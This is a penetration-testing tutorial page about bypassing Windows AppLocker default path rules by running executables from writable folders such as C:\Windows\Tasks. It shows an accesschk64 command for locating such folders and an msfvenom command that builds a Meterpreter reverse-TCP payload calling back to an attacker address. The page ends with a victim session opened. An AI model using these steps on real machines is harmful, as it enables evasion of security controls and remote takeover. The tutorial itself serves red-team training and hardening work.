<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">Bypass Application Whitelisting using Weak Path Rule</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/bypass-application-whitelisting-using-weak-path-rule/" rel="bookmark"><time class="entry-date published" datetime="2019-02-06T03:57:28+00:00">February 6, 2019</time><time class="updated" datetime="2025-06-03T13:29:09+00:00">June 3, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">Finding loopholes is very important when you are part of a penetration testing team. Because such loopholes are the source of hacking as the attacker will actively look for them. So in order to patch such loopholes, you must know how to and where to find them. One of such loopholes is something known as weak folders in windows.</span></p>
<h3 class="ai-optimize-26"><span style="color: #800000;">Understanding Windows Security Policies</span></h3>
<p class="ai-optimize-7"><span style="color: #000000;">To secure Windows, there are multiple security policies provided by Microsoft. One of such policies does not allow an exe file to execute which means a malicious exe file that can be sent by an attacker will not work in the targeted PC. To apply such policy, you need to go into the local security policy of Windows &gt; Applocker &gt; Executable Rules &gt; and then apply the policy. As you can see in the image below the default rule has been set.</span></p>
<p class="ai-optimize-8"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-RbKbg59FJlo/XFpaOIYB99I/AAAAAAAAclM/UIRvXBGUSdIQJjcLyAnLer4TF6DwP0ZnACLcBGAs/s1600/1.png"/></span></p>
<p class="ai-optimize-9"><span style="color: #000000;">Now, if you try to run any given .exe file, it will not run. Here, I have tried to execute putty.exe file but as you can see in the image below it does not run.</span></p>
<p class="ai-optimize-10"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-oNIU0G3bzNg/XFpaOLtWcVI/AAAAAAAAclU/MSi3-rQfWfEFvs2pOFHZe1sijG4IxkSxACLcBGAs/s1600/2.png"/></span></p>
<h3 class="ai-optimize-27"><span style="color: #800000;">Identifying Vulnerable Folders</span></h3>
<p class="ai-optimize-11"><span style="color: #000000;">The loophole to this policy is that there still few folders, which despite such activated security policies, has the write and read permissions and such files will execute from these folders. If I run the same exe i.e. putty.exe in the C drive &gt; windows &gt; tasks folder then it will be executed as shown in the image below.</span></p>
<p class="ai-optimize-12"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-uVIKvWbglwM/XFpaONjFD-I/AAAAAAAAclQ/HSSKiqO94iMPIJH-ygbkG4LLCTjbm70HgCLcBGAs/s1600/3.png"/></span></p>
<p class="ai-optimize-13"><span style="color: #000000;">To check which folders have read and write permission, you can use the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">accesschk64.exe "Users" c:/Windows -w</pre>
<p class="ai-optimize-14"><span style="color: #000000;">Using this command, you can see in the following image that everywhere the access is denied except for the temp, task and tracing folders.</span></p>
<p class="ai-optimize-15"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-jAGXlplQqq4/XFpaPNJTTNI/AAAAAAAAclY/VBCk2bUKYHUEQJI5gxEKVqnpuiq4GO2XACLcBGAs/s1600/4.png"/></span></p>
<h3 class="ai-optimize-28"><span style="color: #800000;">Exploiting the Loophole with Malicious Payload</span></h3>
<p class="ai-optimize-16"><span style="color: #000000;">Now let’s experiment with a malware which we will create using msfvenom for the targeted PC with the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.107 lport=1234 -f exe &gt; shell.exe</pre>
<p class="ai-optimize-17"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-_y-aazykwgk/XFpaPG1fv3I/AAAAAAAAclc/OXGie4GKzwUMnL88RKbf9keLSBsROInowCLcBGAs/s1600/5.png"/></span></p>
<p class="ai-optimize-18"><span style="color: #000000;">When you execute the above malware in the victims’ PC, it will not run due to the applicable security policies.</span></p>
<p class="ai-optimize-19"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-dM69InXPrCU/XFpaPlEAPJI/AAAAAAAAclg/-ss9UszoAW4nx2EI0Tnfl5LSZSpnuVOJACLcBGAs/s1600/6.png"/></span></p>
<p class="ai-optimize-20"><span style="color: #000000;">But, if using the loophole, you execute the file from the tasks folder as shown in the image below:</span></p>
<p class="ai-optimize-21"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-w-i9UMuIH_Q/XFpaP0mEAcI/AAAAAAAAclk/PYbgNVYupEoB1EOaB_xNsCvMp6sfIT9bACLcBGAs/s1600/7.png"/></span></p>
<p class="ai-optimize-22"><span style="color: #000000;">Then, you will have your meterpreter session as desired.</span></p>
<p class="ai-optimize-23"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-LjCCorKCXvA/XFpaQFNcoAI/AAAAAAAAclo/nEtJSy0tcqUD8Hu5kc_xXSOu7QpI_X7AgCLcBGAs/s1600/8.png"/></span></p>
<p class="ai-optimize-24"><span style="color: #000000;">So, while providing security or attacking, you must know everything about the targeted machine. So that you can use their security against them, or provide even better security by patching such loopholes.</span></p>
<p class="ai-optimize-6"><span style="color: #000000;">To learn more about Red Teaming. Follow this </span><strong><a href="https://www.hackingarticles.in/category/red-teaming/">link.</a></strong></p>
<p class="ai-optimize-25"><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <strong><a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
